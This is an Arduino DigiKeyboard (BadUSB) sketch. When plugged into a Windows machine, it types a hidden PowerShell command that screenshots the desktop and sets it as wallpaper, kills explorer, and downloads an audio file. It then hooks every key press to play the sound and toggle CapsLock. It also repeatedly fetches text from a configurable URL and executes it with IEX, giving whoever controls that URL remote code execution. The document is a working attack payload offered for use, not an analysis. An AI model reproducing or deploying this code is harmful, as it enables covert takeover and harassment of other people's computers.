#include "DigiKeyboard.h"

void setup() {}

void loop() {
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  DigiKeyboard.print("powershell -NoP -W Hidden -C \"Add-Type -As System.Windows.Forms,System.Drawing;$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;$b=New-Object Drawing.Bitmap($s.Width,$s.Height);$g=[Drawing.Graphics]::FromImage($b);$g.CopyFromScreen(0,0,0,0,$s.Size);$p=\\\"$env:TEMP\\b.png\\\";$b.Save($p);$w=Add-Type -Member '[DllImport(\\\"user32.dll\\\")]public static extern int SystemParametersInfo(int u,int v,string l,int f);' -Name W -PassThru;$w::SystemParametersInfo(20,0,$p,3);stop-process -name explorer -force;$u='https://github.com/sky-stingray/music-folder/raw/refs/heads/main/fahhhhh.wav';$f=\\\"$env:TEMP\\s.wav\\\";$mURL='YOUR_RAW_URL_HERE';$wc=New-Object Net.WebClient;$wc.DownloadFile($u,$f);$m=New-Object Media.SoundPlayer $f;$sh=New-Object -Com WScript.Shell;$a=Add-Type -PassThru -Name J -Member '[DllImport(\\\"user32.dll\\\")]public static extern short GetAsyncKeyState(int v);';$oldCmd=$wc.DownloadString($mURL);while(1){for($i=1;$i -le 254;$i++){if($a::GetAsyncKeyState($i) -band 0x8000){$m.Play();$sh.SendKeys('{CAPSLOCK}');break}};$t++;if($t -gt 100){$newCmd=$wc.DownloadString($mURL);if($newCmd -ne $oldCmd){IEX $newCmd;$oldCmd=$newCmd};$t=0};Start-Sleep -m 10}\"");

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for(;;){}
}
